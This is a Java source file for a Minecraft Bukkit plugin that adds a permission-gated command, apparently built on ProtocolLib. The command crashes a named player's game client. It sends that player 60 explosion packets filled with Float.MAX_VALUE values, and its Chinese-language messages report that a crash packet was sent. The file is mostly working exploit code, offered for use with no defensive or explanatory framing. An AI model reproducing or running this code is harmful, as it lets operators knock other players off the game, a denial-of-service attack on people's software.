package ew.sr.x1c.quilt.meow.plugin.NoExplode.base;

import com.comphenix.protocol.PacketType.Play.Server;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.List;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class CrashCommand implements CommandExecutor {

    private static final int PACKET_COUNT = 60;

    public static void crashPlayer(Player player) throws InvocationTargetException {
        PacketContainer packet = new PacketContainer(Server.EXPLOSION);
        Location location = player.getLocation();
        packet.getDoubles().write(0, location.getX());
        packet.getDoubles().write(1, location.getY());
        packet.getDoubles().write(2, location.getZ());
        packet.getFloat().write(0, Float.MAX_VALUE);
        packet.getSpecificModifier(List.class).write(0, new ArrayList(0));
        packet.getFloat().write(1, Float.MAX_VALUE);
        packet.getFloat().write(2, Float.MAX_VALUE);
        packet.getFloat().write(3, Float.MAX_VALUE);
        ProtocolManager manager = ProtocolLibrary.getProtocolManager();
        for (int i = 0; i < PACKET_COUNT; ++i) {
            manager.sendServerPacket(player, packet, false);
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (!sender.hasPermission("quilt.client.crash")) {
            sender.sendMessage(ChatColor.RED + "權限不足 無法使用該指令");
            return true;
        }

        if (args.length <= 0) {
            sender.sendMessage(ChatColor.RED + "請輸入指定玩家");
            return false;
        }
        Player player = Bukkit.getPlayer(args[0]);
        if (player == null) {
            sender.sendMessage(ChatColor.RED + "找不到該玩家");
            return true;
        }

        try {
            crashPlayer(player);
            sender.sendMessage(ChatColor.GREEN + "已對目標玩家發送崩潰封包");
        } catch (InvocationTargetException ex) {
            sender.sendMessage(ChatColor.YELLOW + "發送封包時發生例外狀況");
        }
        return true;
    }
}
